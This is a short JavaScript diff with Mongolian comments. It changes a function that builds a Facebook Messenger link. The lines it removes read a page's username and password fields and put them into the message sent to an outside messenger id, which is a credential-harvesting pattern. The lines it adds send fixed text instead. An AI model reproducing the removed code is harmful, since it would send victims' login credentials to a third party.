@@ -1,8 +1,5 @@
 function sendToMessenger() {
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    const message = `Нэвтрэх нэр: ${username}\nНууц үг: ${password}`;
+    const message = "Tulip Tulip"; // Facebook Messenger руу илгээх текст
 
     // Messenger руу илгээх URL
     const messengerUrl = `https://m.me/your-messenger-id?text=${encodeURIComponent(message)}`;
